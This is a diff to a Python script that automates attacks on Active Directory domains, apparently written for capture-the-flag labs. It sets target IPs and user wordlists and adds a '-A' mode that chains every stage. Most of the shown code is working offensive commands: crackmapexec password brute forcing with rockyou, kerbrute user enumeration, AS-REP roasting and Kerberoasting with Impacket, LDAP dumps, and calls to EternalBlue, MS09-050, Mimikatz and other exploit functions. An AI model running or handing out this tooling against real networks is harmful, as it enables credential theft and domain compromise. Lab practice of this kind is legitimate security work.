@@ -11,20 +11,23 @@ from subprocess import call
 import urllib.request
 from os import system
 
-lhost = "10.18.124.41" #Your LHOST IP
+lhost = "192.168.0.29" #Your LHOST IP
 lport = "80" #Your web port (ex: 8080)
-inter = "tun1" #Your interface (ex: tun0 or eth0)
-domainip = "10.10.254.160" #Domain IP you are attacking if you do not know do a crackmapexec smb <rhost ip> -u fjdkasf -p /usr/share/wordlists/rockyou.txt and it will show you the domain name
-domain = "spookysec.local" #Domain name
+inter = "eth0" #Your interface (ex: tun0 or eth0)
+domainip = "192.168.0.41" #Domain IP you are attacking if you do not know do a crackmapexec smb <rhost ip> -u fjdkasf -p /usr/share/wordlists/rockyou.txt and it will show you the domain name
+domain = "privesc" #Domain name
 username = "" #if you have a username for the domain you are attacking insert here
-userfile = "/home/kali/Desktop/THM/AttackiveDirectory/userlist.txt" #if you have a user file put here
+userfile = "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt" #if you have a user file put here
 password = "" #if you have a password that goes along with the username put here
-passfile = "/home/kali/Desktop/THM/AttackiveDirectory/passwordlist.txt" #if you have a password file put here
+passfile = "" #if you have a password file put here
+
+#Running multiple arguments is fine, howevever if running multiple and wanting to run Bloodhound make sure Bloodhound goes last...
 
 parser = argparse.ArgumentParser(description="Enum AD",
 formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 parser.add_argument("-D", "--Download", action="store_true", help="Download tools")
 parser.add_argument("-s", "--scan", action="store_true", help="Scan Domain for open ports")
+parser.add_argument("-A", "--attack", action="store_true", help="Try tries everything")
 parser.add_argument("-B", "--BloodHound", action="store_true", help="Run bloodhound-python")
 parser.add_argument("-C", "--Crackmapexec", action="store_true", help="Will try a bunch of things with crackmapexec")
 parser.add_argument("-S", "--SMBKiller", action="store_true", help="Run SMB_Killer Script by OvergrownCarrot1 to hopefully get NetNTLMv2 Hashes from share")
@@ -33,9 +36,10 @@ parser.add_argument("-E", "--Eternal", action="store_true", help="Test for Etern
 parser.add_argument("-9", "--MS09050", action="store_true", help="Test for MS09-050 and automatically exploit")
 parser.add_argument("-M", "--Mimikatz", action="store_true", help="Will run mimikatz with crackmapexec, note takes a long time to run")
 parser.add_argument("-e", "--enum4linux", action="store_true", help="Will run enum4linux")
-parser.add_argument("-a", "--attack", action="store_true", help="Try and run differnet things on the system")
 parser.add_argument("-c", "--crack", action="store_true", help="Crack hashes with john the ripper")
 args = parser.parse_args()
+
+print("\033[1;33m Use -h to see the differnet arguments that can be ran\033[1;39m")
 
 def scan():
 	ret_code = system("ls "+domainip+"-rustscan.txt")
@@ -384,20 +388,12 @@ def attack():
 			system("ldapdomaindump "+domainip+"")
 			system("mv domain* LDAP/")
 			print("\033[1;31m Tried anonymous ldapdomaindump and put in LDAP folder\033[1;39m\n")
-		if (len(userfile) != 0) and (len(password) == 0) and (len(passfile) == 0 ):
-			system("crackmapexec smb "+domainip+" -u "+username+" -p /usr/share/wordlists/rockyou.txt")
-			system("locate kerbrute_linux_amd64\n")
-			ker = input("Full file path to kerbrute?\n")
-			threads = input("How many threads would you like to run, higher is faster?:\n")
-			print(ker+" userenum -d "+domain+" --dc "+domainip+" "+userfile+"")
-			system(ker+" userenum -d "+domain+" --dc "+domainip+" "+userfile+"")
-			system("GetNPUsers.py "+domainip+"/ -no-pass -usersfile "+userfile+" -dc-ip "+domainip+"")
+			print("\033[1;35m Opening firefox for ldapdomaindump, make sure to look at all pages\033[1;39m\n")
+			system("firefox LDAP/*.html")
 		if (len(username) != 0 ) and (len(password) != 0 ):
 			print("\033[1;31m Making directory LDAP and doing LDAP domain dump\033[1;39m\n")
 			sys = ""+domain+"/"+username+":"+password+" -dc-ip "+domainip+""
 			print("ldapdomaindump trying on "+domainip+" in domain "+domain+" with user "+username+" and password "+password+"")
-			shutil.rmtree("LDAP")
-			system("mkdir LDAP")
 			print("\033[1;31m Tried ldapdomaindump and put in LDAP folder\033[1;39m\n")
 			system("ldapdomaindump "+domainip+" -u "'"'+domain+'\\'+username+'"'" -p "+password+"")
 			system("mv domain* LDAP/")
@@ -405,33 +401,36 @@ def attack():
 			print("\033[1;35m Opening firefox for ldapdomaindump, make sure to look at all pages\033[1;39m\n")
 			system("firefox LDAP/*.html")
 			print("\033[1;31m Testing GetADUsers.py\033[1;39m\n")
-			system("GetADUsers.py " +domain+"/"+username+":"+password+" -dc-ip "+domainip+"")
+			system("GetADUsers.py " +sys+"")
 			print("\033[1;32m Testing GetUsersSPNs.py\033[1;39m\n")
 			system("GetUserSPNs.py "+sys+"")
-			time.sleep(2)
+			print("\033[1;31m Trying LDAPSEARCH\033[1;39m\n")
+			DC = input("\033[1;32m DC, for this we just need the first part, (ex: if DC is cyber.local then it would be cyber) \033[1;39m\n")
+			loc = input("\033[1;33m DC, for this we just need the second part of the FQDN (ex: local no period) \033[1;39m\n")
+			print("\033[1;31m Putting ldapsearch results into ldap.txt\033[1;39m\n")
+			system("ldapsearch -H ldap://"+domainip+" -x -b DC="+DC+",DC="+loc+' "(objectclass=person)" -D '+username+' -w '+password+' > ldap.txt')
+			print("\033[1;31m Looking in ldap.txt for description and samaccountname\033[1;39m\n")
+			system("cat ldap.txt | grep -i description")
+			system("cat ldap.txt | grep -i samaccountname")
 		if (len(userfile) != 0):
 			system("locate kerbrute_linux_amd64")
-			ker = input("Full file path to kerbrute?\n")
-			threads = input("How many threads would you like to run, higher is faster?\n")
+			ker = input("\033[1;32m Full file path to kerbrute?\033[1;39m\n")
+			threads = input("\033[1;32m How many threads would you like to run, higher is faster?\033[1;39m\n")
 			print(ker+" userenum -d "+domain+" --dc "+domainip+" "+userfile+"\n")
-			system(ker+" userenum -d "+domain+" --dc "+domainip+" "+username+" -t "+threads+"\n")
-			system("GetNPUsers.py "+domainip+"/ -no-pass -usersfile "+userfile+" -dc-ip "+domainip+"\n")
-	print("\033[1;31m Trying LDAPSEARCH incase ldapdomaindump didn't work\033[1;39m\n")
+			system(ker+" userenum -d "+domain+" --dc "+domainip+" "+userfile+"\n")
+			system("GetNPUsers.py "+domain+"/ -no-pass -usersfile "+userfile+" -dc-ip "+domainip+"\n")
+		if (len(userfile) != 0 ) and (len(password) != 0):
+			print("\033[1;31m Brute forcing username with crackmapexec\033[1;39m\n")
+			system("crackmapexec smb "+domainip+" -u "+userfile+" -p "+password+"")
+		if (len(username) !=0 ) and (len(passfile) != 0):
+			print("\033[1;31m Brute forcing username with crackmapexec\033[1;39m\n")
+			system("crackmapexec smb "+domainip+" -u "+username+" -p "+passfile+"")
 	if (len(username) == 0) and (len(password) == 0 ):
 		print("\033[1;31m Trying LDAPSEARCH with no username or password\033[1;39m\n")
 		DC = input("\033[1;32m DC, for this we just need the first part, (ex: if DC is cyber.local then it would be cyber) \033[1;39m\n")
 		loc = input("\033[1;33m DC, for this we just need the second part of the FQDN (ex: local no period) \033[1;39m\n")
 		print("\033[1;31m Putting ldapsearch results into ldap.txt\033[1;39m\n")
 		system("ldapsearch -H ldap://"+domainip+" -x -b DC="+DC+",DC="+loc+' "(objectclass=person)" > ldap.txt')
-		print("\033[1;31m Looking in ldap.txt for description and samaccountname\033[1;39m\n")
-		system("cat ldap.txt | grep -i description")
-		system("cat ldap.txt | grep -i samaccountname")
-	if (len(username) != 0 ) and (len(password) != 0 ):
-		print("\033[1;31m Trying LDAPSEARCH\033[1;39m\n")
-		DC = input("\033[1;32m DC, for this we just need the first part, (ex: if DC is cyber.local then it would be cyber) \033[1;39m\n")
-		loc = input("\033[1;33m DC, for this we just need the second part of the FQDN (ex: local no period) \033[1;39m\n")
-		print("\033[1;31m Putting ldapsearch results into ldap.txt\033[1;39m\n")
-		system("ldapsearch -H ldap://"+domainip+" -x -b DC="+DC+",DC="+loc+' "(objectclass=person)" -D '+username+' -w '+password+' > ldap.txt')
 		print("\033[1;31m Looking in ldap.txt for description and samaccountname\033[1;39m\n")
 		system("cat ldap.txt | grep -i description")
 		system("cat ldap.txt | grep -i samaccountname")
@@ -497,4 +496,13 @@ if args.crack == True:
 if args.enum4linux == True:
 	enum4linux()
 if args.attack == True:
+	download()
+	scan()
+	enum4linux()
 	attack()
+	eternal()
+	MS09050()
+	crackmapexec()
+	mimikatz()
+	zero()
+	bloodhound()
